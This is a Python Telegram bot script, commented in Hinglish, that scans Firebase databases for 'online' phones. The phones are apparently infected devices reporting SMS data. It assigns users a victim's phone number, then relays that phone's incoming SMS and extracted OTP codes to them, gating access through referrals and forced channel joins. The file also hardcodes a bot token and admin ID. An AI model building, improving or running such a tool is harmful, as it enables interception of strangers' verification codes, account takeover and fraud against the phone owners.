# otp bot.py — PART 1/2
import telebot
import requests
import json
import re
import time
import datetime
import threading
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# ==========================================
# ⚙️ CONFIGURATION (YAHAN APNI DETAILS DAALO)
# ==========================================
BOT_TOKEN = "9223833673:AAGSgl5KRcshFHqn73QGfVI7iBImXpKDXUY" # BotFather se token
ADMIN_ID = 8341244619              # Tumhari Telegram ID (Admin)

bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "database.json"

# ==========================================
# 🗄️ LOCAL DATABASE (Sab data yahan save hoga)
# ==========================================
def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "users": {}, 
            "firebases": [], 
            "force_join_channels": [], 
            "active_monitors": {},
            "bot_photo_url": ""
        }

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db_data = load_db()

# ==========================================
# 🔍 OTP AUTO-DETECT & FORMATTING
# ==========================================
def extract_otp(text):
    match = re.search(r'\b\d{4,6}\b', text)
    return match.group(0) if match else "Not Detected"

def format_sms_message(sender, sms_text, time_str):
    otp = extract_otp(sms_text)
    return f"""💬 <b>ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!</b>
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📱 <b>ꜰ𝗿𝗼𝗺:</b> {sender}
⏱️ <b>ᴛ𝗶ᴍ𝗲:</b> {time_str}

<b>{sms_text}</b>

🔑 <b>ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ:</b> <code>{otp}</code>"""

# ==========================================
# 🛡️ DYNAMIC FORCE JOIN CHECK
# ==========================================
def check_force_join(user_id):
    if str(user_id) == str(ADMIN_ID):
        return True
    channels = db_data.get("force_join_channels", [])
    if not channels:
        return True
    
    for channel in channels:
        try:
            member = bot.get_chat_member(f"@{channel}", user_id)
            if member.status in ['left', 'kicked']:
                return False
        except Exception:
            return False
    return True

def get_force_join_markup():
    markup = InlineKeyboardMarkup()
    channels = db_data.get("force_join_channels", [])
    for channel in channels:
        markup.add(InlineKeyboardButton(f"Join @{channel}", url=f"https://t.me/{channel}"))
    markup.add(InlineKeyboardButton("✅ Verify / Joined", callback_data="verify_join"))
    return markup

# ==========================================
# 👤 USER PANEL & /start COMMAND
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    
    if not check_force_join(message.from_user.id):
        bot.send_message(message.chat.id, 
            "⚠️ <b>Access Denied!</b>\n\nBot use karne ke liye pehle neeche diye gaye channels join karein. Uske baad 'Verify' button dabayein.", 
            reply_markup=get_force_join_markup(), parse_mode='HTML')
        return

    if user_id not in db_data['users']:
        db_data['users'][user_id] = {
            "name": user_name,
            "expiry": 0,
            "refers": 0,
            "otps_received": 0,
            "captcha_verified_at": 0
        }
        save_db(db_data)

    last_verify = db_data['users'][user_id].get('captcha_verified_at', 0)
    if time.time() - last_verify < 86400:
        show_main_menu(message.chat.id, message.from_user.id)
        return

    num1 = random.randint(1, 10)
    num2 = random.randint(1, 10)
    ans = num1 + num2
    
    markup = InlineKeyboardMarkup()
    options = [ans, ans + random.randint(1, 5), ans - random.randint(1, 5)]
    random.shuffle(options)
    
    row = []
    for opt in options:
        row.append(InlineKeyboardButton(str(opt), callback_data=f"captcha_{opt}_{ans}"))
    markup.row(*row)

    bot.send_message(message.chat.id, 
        f"🔒 <b>VERIFY CAPTCHA</b>\n\n🧮 Solve: <b>{num1} + {num2} = ?</b>", 
        reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith('captcha_'))
def captcha_handler(call):
    _, clicked, correct = call.data.split('_')
    
    if clicked == correct:
        db_data['users'][str(call.from_user.id)]['captcha_verified_at'] = time.time()
        save_db(db_data)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message.chat.id, call.from_user.id)
    else:
        bot.answer_callback_query(call.id, "❌ Wrong Answer! Try again.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'verify_join')
def verify_join_handler(call):
    if check_force_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message.chat.id, call.from_user.id)
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak channel join nahi kiya hai!", show_alert=True)

# ==========================================
# 🎛️ MAIN MENU
# ==========================================
def show_main_menu(chat_id, user_id):
    user_id = str(user_id)
    user = db_data['users'].get(user_id, {})
    is_owner = (user_id == str(ADMIN_ID))
    
    expiry = user.get('expiry', 0)
    current_time = time.time()
    
    if is_owner:
        status_text = "👑 <b>ACCESS :</b> Owner (Unlimited)"
    elif current_time > expiry:
        status_text = "⏳ <b>ACCESS :</b> Expired"
    else:
        remaining = int(expiry - current_time)
        mins = remaining // 60
        secs = remaining % 60
        status_text = f"⏳ <b>ACCESS :</b> {mins}m {secs}s"

    ref_link = f"https://t.me/{bot.get_me().username}?start=ref_{user_id}"
    
    caption = f"""🌸 <b>Hii {user.get('name', 'User')} ⚡</b>

🚀 Welcome to OTP Bot ☀️

{status_text}

🔗 <b>YOUR REFERRAL LINK :</b>
<code>{ref_link}</code>

📊 <b>TOTAL REFERRALS :</b> {user.get('refers', 0)}

🎁 1 REFER = 1 HOURS ACCESS

👇 <b>Tap below to start</b>"""

    markup = InlineKeyboardMarkup()
    if is_owner or current_time <= expiry:
        markup.add(InlineKeyboardButton("🎲 GENERATE NUMBER", callback_data="generate_number"))
    else:
        markup.add(InlineKeyboardButton("🔗 Share Referral Link", url=f"https://t.me/share/url?url={ref_link}"))

    photo_url = db_data.get("bot_photo_url", "").strip()
    if photo_url:
        try:
            bot.send_photo(chat_id, photo_url, caption=caption, reply_markup=markup, parse_mode='HTML')
            return
        except Exception:
            pass
    bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='HTML')

# ==========================================
# 🎲 GENERATE NUMBER (FIREBASE SE DEVICE LANA)
# ==========================================
def get_online_devices():
    all_devices = []
    firebases = db_data.get("firebases", [])
    
    if not firebases:
        return None
        
    for fb_url in firebases:
        fb_url = fb_url.strip().rstrip('/')
        try:
            res = requests.get(f"{fb_url}/.json", timeout=10)
            print(f"[FB DEBUG] {fb_url}/.json -> {res.status_code} | raw: {res.text[:300]}")
            if res.status_code != 200 or not res.json():
                continue
                
            root_data = res.json()
            
            def _scan(node, current_path=""):
                if isinstance(node, dict):
                    status_val = str(node.get('status', '')).lower()
                    online_val = str(node.get('online', '')).lower()
                    is_online = status_val in ['online', 'active', '1', 'true', 'connected'] or online_val in ['true', '1', 'online']
                    
                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim']):
                        dev_id = current_path.split('/')[-1] or node.get('device_id', node.get('id', 'Unknown'))
                        if dev_id not in db_data.get('active_monitors', {}):
                            if not any(d['device_id'] == dev_id for d in all_devices):
                                # fixed: broader key matching for phone number and network
                                num = node.get('number') or node.get('phone') or node.get('phoneNumber') or node.get('sim_number') or node.get('msisdn') or node.get('sim1') or 'Unknown'
                                net = node.get('network') or node.get('operator') or node.get('carrier') or node.get('network_type') or node.get('net_type') or 'N/A'
                                
                                all_devices.append({
                                    "device_id": dev_id,
                                    "number": num,
                                    "battery": str(node.get('battery', node.get('batteryLevel', 'N/A'))),
                                    "network": net,
                                    "path": current_path, # Save path to fetch SMS later
                                    "fb_url": fb_url
                                })
                        return
                    for k, v in node.items():
                        _scan(v, f"{current_path}/{k}" if current_path else k)
                elif isinstance(node, list):
                    for i, v in enumerate(node):
                        _scan(v, f"{current_path}/{i}")
                        
            _scan(root_data)
            
        except Exception as e:
            print(f"Firebase fetch error: {e}")
            
    return all_devices

@bot.callback_query_handler(func=lambda call: call.data == 'generate_number')
def generate_number_handler(call):
    user_id = str(call.from_user.id)
    
    if user_id != str(ADMIN_ID):
        if time.time() > db_data['users'].get(user_id, {}).get('expiry', 0):
            bot.answer_callback_query(call.id, "⚠️ Your access has expired. Please refer to get access.", show_alert=True)
            return

    # fixed: free previously locked device and delete old message
    for dev_id in list(db_data['active_monitors'].keys()):
        if db_data['active_monitors'][dev_id]['user_id'] == user_id:
            del db_data['active_monitors'][dev_id]
            save_db(db_data)
            
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass

    msg = bot.send_message(call.message.chat.id, "⏳ <i>Scanning online devices from Firebase, please wait...</i>", parse_mode='HTML')
    
    devices = get_online_devices()
    
    if devices is None:
        bot.edit_message_text("❌ Admin ne abhi tak koi Firebase account add nahi kiya hai.", chat_id=call.message.chat.id, message_id=msg.message_id)
        return
        
    if not devices:
        bot.edit_message_text("⚠️ Abhi koi device online nahi hai ya sabhi devices dusre users ke paas lock hain. Thodi der baad try karein.", chat_id=call.message.chat.id, message_id=msg.message_id)
        return

    selected_dev = random.choice(devices)
    
    db_data['active_monitors'][selected_dev['device_id']] = {
        "user_id": user_id,
        "start_time": time.time(),
        "last_action": time.time(),
        "number": selected_dev['number'],
        "fb_url": selected_dev['fb_url'], # fixed: store url and path for SMS retrieval
        "path": selected_dev['path']
    }
    save_db(db_data)

    show_monitor_ui(call.message.chat.id, msg.message_id, selected_dev)

def show_monitor_ui(chat_id, msg_id, device):
    text = f"""📟 <b>Device:</b> <code>{device['device_id']}</code>
🌐 <b>Status:</b> 🟢 ONLINE
📱 <b>Phone:</b> {device['number']}
📶 <b>Network:</b> {device['network']}
🔋 <b>Battery:</b> {device['battery']}

<i>Waiting for new SMS... OTP will automatically appear here.</i>"""

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_monitor"))
    markup.add(InlineKeyboardButton("📩 LAST 5 SMS", callback_data="view_sms")) # fixed: added last 5 sms button
    markup.add(InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number"))
    markup.add(InlineKeyboardButton("⬅️ BACK TO DEVICE", callback_data="back_to_main"))

    try:
        bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode='HTML')
    except:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'view_sms')
def view_sms_handler(call):
    user_id = str(call.from_user.id)
    
    active_dev = None
    monitor_info = None
    for dev_id, data in db_data['active_monitors'].items():
        if data['user_id'] == user_id:
            active_dev = dev_id
            monitor_info = data
            break
            
    if not active_dev:
        bot.answer_callback_query(call.id, "⚠️ No active monitor found.", show_alert=True)
        return
        
    fb_url = monitor_info.get('fb_url')
    path = monitor_info.get('path')
    
    if not fb_url or not path:
        bot.answer_callback_query(call.id, "⚠️ Device info missing.", show_alert=True)
        return
        
    try:
        res = requests.get(f"{fb_url}/{path}.json", timeout=10)
        if res.status_code == 200 and res.json():
            dev_info = res.json()
            sms_list = []
            for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
                if key in dev_info and dev_info[key]:
                    raw_sms = dev_info[key]
                    if isinstance(raw_sms, list):
                        sms_list = raw_sms
                    elif isinstance(raw_sms, dict):
                        sms_list = list(raw_sms.values())
                    elif isinstance(raw_sms, str):
                        sms_list = [{"message": raw_sms, "sender": "Unknown"}]
                    break
            
            if not sms_list:
                bot.answer_callback_query(call.id, "No SMS found for this device.", show_alert=True)
                return
                
            last_5 = sms_list[-5:]
            text = f"📩 <b>Last {len(last_5)} SMS for <code>{active_dev}</code></b>\n\n"
            for i, sms in enumerate(last_5):
                if isinstance(sms, dict):
                    msg_body = sms.get('message', sms.get('text', str(sms)))
                    sndr = sms.get('sender', sms.get('from', 'Unknown'))
                else:
                    msg_body = str(sms)
                    sndr = 'Unknown'
                text += f"<b>{i+1}. From:</b> {sndr}\n<code>{msg_body}</code>\n\n"
                
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, text, parse_mode='HTML')
        else:
            bot.answer_callback_query(call.id, "⚠️ Could not fetch SMS.", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Error fetching SMS.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'refresh_monitor')
def refresh_monitor_handler(call):
    user_id = str(call.from_user.id)
    for dev_id, data in db_data['active_monitors'].items():
        if data['user_id'] == user_id:
            data['last_action'] = time.time()
            save_db(db_data)
            bot.answer_callback_query(call.id, "🔄 Refreshed! Waiting for SMS...")
            return
    bot.answer_callback_query(call.id, "⚠️ No active monitor found. Please generate again.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
def back_to_main_handler(call):
    user_id = str(call.from_user.id)
    for dev_id in list(db_data['active_monitors'].keys()):
        if db_data['active_monitors'][dev_id]['user_id'] == user_id:
            del db_data['active_monitors'][dev_id]
            save_db(db_data)
    
    bot.delete_message(call.message.chat.id, call.message.message_id)
    show_main_menu(call.message.chat.id, call.from_user.id)

# ==========================================
# 🔄 BACKGROUND SCANNER (OTP DHOONDHNA & 10 MIN TIMER)
# ==========================================
def background_scanner():
    sent_messages = set()
    
    while True:
        try:
            current_time = time.time()
            
            if 'active_monitors' in db_data:
                for dev_id in list(db_data['active_monitors'].keys()):
                    monitor = db_data['active_monitors'][dev_id]
                    if current_time - monitor['last_action'] > 600:
                        user_id = monitor['user_id']
                        del db_data['active_monitors'][dev_id]
                        save_db(db_data)
                        
                        stop_msg = """⏱️ <b>MONITOR AUTO-STOPPED</b>

⚠️ <i>10 minutes se koi button nahi dabaya</i>

🔄 Access again ke liye /start dabao aur naya monitor start karo."""
                        try:
                            bot.send_message(user_id, stop_msg, parse_mode='HTML')
                        except:
                            pass

            # fixed: scan only active monitored devices directly using their paths
            for dev_id, monitor in list(db_data['active_monitors'].items()):
                fb_url = monitor.get('fb_url')
                dev_path = monitor.get('path')
                locked_user = monitor['user_id']
                
                if not fb_url or not dev_path:
                    continue
                    
                try:
                    res = requests.get(f"{fb_url}/{dev_path}.json", timeout=5)
                    if res.status_code == 200:
                        dev_info = res.json()
                        if dev_info:
                            sms_text = None
                            sender = "Unknown"
                            
                            if isinstance(dev_info, dict):
                                for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
                                    if key in dev_info and dev_info[key]:
                                        if isinstance(dev_info[key], list) and len(dev_info[key]) > 0:
                                            latest_sms = dev_info[key][-1]
                                            sms_text = latest_sms.get('message', latest_sms.get('text', str(latest_sms)))
                                            sender = latest_sms.get('sender', latest_sms.get('from', 'Unknown'))
                                        elif isinstance(dev_info[key], dict):
                                            sms_text = dev_info[key].get('message', dev_info[key].get('text', ''))
                                            sender = dev_info[key].get('sender', dev_info[key].get('from', 'Unknown'))
                                        elif isinstance(dev_info[key], str):
                                            sms_text = dev_info[key]
                                        
                                        if sms_text: break
                            
                            if sms_text:
                                msg_hash = f"{dev_id}_{hash(sms_text)}"
                                
                                if msg_hash not in sent_messages:
                                    sent_messages.add(msg_hash)
                                    
                                    time_str = datetime.datetime.now().strftime("%d-%m-%Y • %I:%M %p")
                                    final_msg = format_sms_message(sender, sms_text, time_str)
                                    try:
                                        bot.send_message(locked_user, final_msg, parse_mode='HTML')
                                        db_data['users'][locked_user]['otps_received'] = db_data['users'][locked_user].get('otps_received', 0) + 1
                                        save_db(db_data)
                                    except Exception as e:
                                        print(f"Error sending OTP to {locked_user}: {e}")
                                        
                except Exception:
                    pass
                    
        except Exception as e:
            print(f"Scanner Error: {e}")
            
        time.sleep(5)
        # ==========================================
# 👑 OWNER PANEL (ADMIN UI & COMMANDS)
# ==========================================
# Admin ke steps track karne ke liye ek chota sa variable
admin_state = {}

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return # Sirf Admin hi use kar sakta hai
    
    # Database se stats nikalenge
    total_users = len(db_data.get('users', {}))
    total_fb = len(db_data.get('firebases', []))
    total_channels = len(db_data.get('force_join_channels', []))
    has_photo = "✅ Set" if db_data.get('bot_photo_url', '').strip() else "❌ Not Set"

    text = f"""👑 <b>OWNER CONTROL PANEL</b>
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
👥 <b>Total Users:</b> {total_users}
🗄️ <b>Firebases Connected:</b> {total_fb}
📢 <b>Force Join Channels:</b> {total_channels}
🖼️ <b>Bot Photo:</b> {has_photo}

<i>Neeche diye gaye buttons se settings manage karein:</i>"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("➕ Add Firebase", callback_data="admin_add_fb"),
        InlineKeyboardButton("➖ Remove Firebase", callback_data="admin_remove_fb")
    )
    markup.add(
        InlineKeyboardButton("📢 Add Channel", callback_data="admin_add_channel"),
        InlineKeyboardButton("🔕 Remove Channel", callback_data="admin_remove_channel")
    )
    markup.add(
        InlineKeyboardButton("🖼️ Set Bot Photo", callback_data="admin_set_photo"),
        InlineKeyboardButton("🗑️ Remove Photo", callback_data="admin_remove_photo")
    )
    markup.add(
        InlineKeyboardButton("⏱️ Give Access", callback_data="admin_give_access"),
        InlineKeyboardButton("🚫 Revoke Access", callback_data="admin_revoke_access")
    )
    markup.add(
        InlineKeyboardButton("👥 View Users", callback_data="admin_view_users"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    )
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='HTML')

# --- Admin Callbacks (Button Clicks) ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    
    action = call.data
    
    # 1. Add Firebase
    if action == "admin_add_fb":
        msg = bot.send_message(call.message.chat.id, "🔗 <b>Firebase Database URL bhejein:</b>\n(Example: <code>https://xyz-default-rtdb.firebaseio.com</code>)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_add_fb)
        
    # 2. Remove Firebase
    elif action == "admin_remove_fb":
        fbs = db_data.get('firebases', [])
        if not fbs:
            bot.answer_callback_query(call.id, "Koi Firebase connected nahi hai!", show_alert=True)
            return
        
        markup = InlineKeyboardMarkup()
        for i, fb in enumerate(fbs):
            markup.add(InlineKeyboardButton(f"❌ Delete: {fb.split('//')[-1]}", callback_data=f"delfb_{i}"))
        bot.edit_message_text("Select Firebase to remove:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # 3. Add Force Join Channel
    elif action == "admin_add_channel":
        msg = bot.send_message(call.message.chat.id, "📢 <b>Channel Username bhejein (bina @ ke):</b>\n(Example: <code>MyUpdateChannel</code>)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_add_channel)

    # 4. Remove Force Join Channel
    elif action == "admin_remove_channel":
        channels = db_data.get('force_join_channels', [])
        if not channels:
            bot.answer_callback_query(call.id, "Koi channel set nahi hai!", show_alert=True)
            return
        
        markup = InlineKeyboardMarkup()
        for i, ch in enumerate(channels):
            markup.add(InlineKeyboardButton(f"❌ Delete: @{ch}", callback_data=f"delch_{i}"))
        bot.edit_message_text("Select Channel to remove:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # 5. Set Bot Photo
    elif action == "admin_set_photo":
        msg = bot.send_message(call.message.chat.id, 
            "🖼️ <b>Photo URL bhejein</b> (direct image link, .jpg / .png):\n\n" \
            "<i>Ya phir seedha photo bhej dein.</i>", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_set_photo)

    # 6. Remove Bot Photo
    elif action == "admin_remove_photo":
        db_data['bot_photo_url'] = ""
        save_db(db_data)
        bot.answer_callback_query(call.id, "✅ Photo removed.", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel(call.message)

    # 7. Give Access
    elif action == "admin_give_access":
        msg = bot.send_message(call.message.chat.id, 
            "⏱️ <b>User ID bhejein</b> jise access dena hai:\n" \
            "<i>(User ko /start dabane par ID milegi, ya View Users me dekh sakte ho)</i>", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_give_access_uid)

    # 8. Revoke Access
    elif action == "admin_revoke_access":
        msg = bot.send_message(call.message.chat.id, "🚫 <b>User ID bhejein</b> jiska access hatana hai:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_revoke_access_uid)

    # 9. View Users
    elif action == "admin_view_users":
        users = db_data.get('users', {})
        if not users:
            bot.answer_callback_query(call.id, "Abhi tak koi user nahi aaya.", show_alert=True)
            return
        
        text = "👥 <b>RECENT USERS (Last 10)</b>\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n"
        count = 0
        for uid, udata in list(users.items())[-10:]: # Last 10 users
            name = udata.get('name', 'Unknown')
            refers = udata.get('refers', 0)
            otps = udata.get('otps_received', 0)
            text += f"👤 <a href='tg://user?id={uid}'>{name}</a>\n┣ ID: <code>{uid}</code>\n┣ Refers: {refers} | OTPs: {otps}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
            count += 1
            
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back to Admin", callback_data="admin_main"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    # 10. Broadcast
    elif action == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, "📢 <b>Broadcast message likhein:</b>\n(Jo message sabko bhejna hai)", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_broadcast)

    # 11. Back to Main Admin Panel
    elif action == "admin_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel(call.message) # Re-trigger main menu

# --- Step Handlers (Processing Inputs) ---

def process_add_fb(message):
    if message.from_user.id != ADMIN_ID: return
    url = message.text.strip()
    if not url.endswith("firebaseio.com") and not url.endswith("firebasedatabase.app"):
        bot.reply_to(message, "❌ Invalid URL! URL 'firebaseio.com' par khatam hona chahiye.")
        return
    
    if url not in db_data['firebases']:
        db_data['firebases'].append(url)
        save_db(db_data)
        bot.reply_to(message, f"✅ Firebase added successfully!\n`{url}`", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ Ye Firebase pehle se added hai.")

def process_add_channel(message):
    if message.from_user.id != ADMIN_ID: return
    ch = message.text.replace("@", "").strip()
    
    try:
        bot.get_chat_member(f"@{ch}", bot.get_me().id)
        if ch not in db_data['force_join_channels']:
            db_data['force_join_channels'].append(ch)
            save_db(db_data)
            bot.reply_to(message, f"✅ Channel @{ch} added to Force Join!")
        else:
            bot.reply_to(message, "⚠️ Ye channel pehle se added hai.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: Bot is channel me admin nahi hai ya channel galat hai.\nDetail: {e}")

def process_set_photo(message):
    if message.from_user.id != ADMIN_ID: return
    
    if message.photo:
        file_id = message.photo[-1].file_id
        db_data['bot_photo_url'] = file_id
        save_db(db_data)
        bot.reply_to(message, "✅ Bot photo set (uploaded image).")
        return
    
    if message.text:
        url = message.text.strip()
        if not (url.startswith("http://") or url.startswith("https://")):
            bot.reply_to(message, "❌ Invalid URL. http:// ya https:// se shuru hona chahiye.")
            return
        db_data['bot_photo_url'] = url
        save_db(db_data)
        bot.reply_to(message, "✅ Bot photo URL set.")
        return
    
    bot.reply_to(message, "❌ Photo ya URL bhejein.")

# --- Give / Revoke Access Flow ---

def process_give_access_uid(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    
    if not uid.isdigit():
        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
        return
    
    if uid not in db_data['users']:
        bot.reply_to(message, "⚠️ Ye user bot me nahi hai. Pehle user ko /start dabana hoga.")
        return
    
    msg = bot.reply_to(message, f"⏱️ <b>Kitne ghante ka access dena hai?</b>\n(Example: <code>24</code> = 24 hours, <code>1</code> = 1 hour)\n\n" \
        f"<i>Ya <code>0</code> likho toh unlimited/owner-level.</i>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_give_access_hours, uid)

def process_give_access_hours(message, uid):
    if message.from_user.id != ADMIN_ID: return
    txt = message.text.strip()
    
    if not txt.isdigit():
        bot.reply_to(message, "❌ Sirf number likho (ghante).")
        return
    
    hours = int(txt)
    
    if hours == 0:
        new_expiry = time.time() + (365 * 24 * 3600 * 100)
        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>Unlimited access</b> de diya gaya.", parse_mode='HTML')
    else:
        new_expiry = time.time() + (hours * 3600)
        bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>{hours} hour(s)</b> ka access de diya gaya.", parse_mode='HTML')
    
    db_data['users'][uid]['expiry'] = new_expiry
    save_db(db_data)
    
    try:
        bot.send_message(uid, 
            f"🎉 <b>ACCESS GRANTED!</b>\n\n⏱️ Tumhe <b>{hours if hours else 'Unlimited'}</b> {'hour(s)' if hours else ''} ka access mil gaya hai.\n\n/start dabao aur generate karo!",
            parse_mode='HTML')
    except Exception:
        pass

def process_revoke_access_uid(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    
    if not uid.isdigit():
        bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
        return
    
    if uid not in db_data['users']:
        bot.reply_to(message, "⚠️ Ye user bot me nahi hai.")
        return
    
    db_data['users'][uid]['expiry'] = 0
    save_db(db_data)
    bot.reply_to(message, f"✅ User <code>{uid}</code> ka access revoke kar diya.", parse_mode='HTML')
    
    try:
        bot.send_message(uid, "⚠️ <b>Access revoked.</b>\n\nNaya access lene ke liye /start dabao.", parse_mode='HTML')
    except Exception:
        pass

def process_broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text
    
    users = list(db_data['users'].keys())
    success = 0
    failed = 0
    
    status_msg = bot.reply_to(message, f"⏳ Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            bot.send_message(uid, msg_text)
            success += 1
            time.sleep(0.05)
        except:
            failed += 1
            
    bot.edit_message_text(f"✅ Broadcast Complete!\n\nSent: {success}\nFailed (Blocked bot): {failed}", message.chat.id, status_msg.message_id)

# --- Remove Callbacks (Delete Buttons) ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('delfb_') or call.data.startswith('delch_'))
def remove_item_handler(call):
    if call.from_user.id != ADMIN_ID: return
    
    action, index = call.data.split('_')
    idx = int(index)
    
    if action == 'delfb':
        removed = db_data['firebases'].pop(idx)
        save_db(db_data)
        bot.answer_callback_query(call.id, f"Deleted {removed}", show_alert=True)
    elif action == 'delch':
        removed = db_data['force_join_channels'].pop(idx)
        save_db(db_data)
        bot.answer_callback_query(call.id, f"Deleted @{removed}", show_alert=True)
        
    bot.delete_message(call.message.chat.id, call.message.message_id)
    admin_panel(call.message)

# ==========================================
# 🚀 BOT KO START KARNE KA LOGIC (MUST BE AT LAST)
# ==========================================
if __name__ == '__main__':
    print("🤖 Bot is starting...")

    # assumption: Render web service requires an open HTTP port.
    # Starting a tiny HTTP server on $PORT so Render's port scan passes.
    import os
    from http.server import BaseHTTPRequestHandler, HTTPServer
    class _Health(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def _serve():
        port = int(os.environ.get("PORT", 10000))
        HTTPServer(("0.0.0.0", port), _Health).serve_forever()
    threading.Thread(target=_serve, daemon=True).start()

    # Background Scanner ko alag thread me start karo
    scanner_thread = threading.Thread(target=background_scanner, daemon=True)
    scanner_thread.start()
    print("🔍 Background Scanner Started...")

    print("✅ Bot is Live Now!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
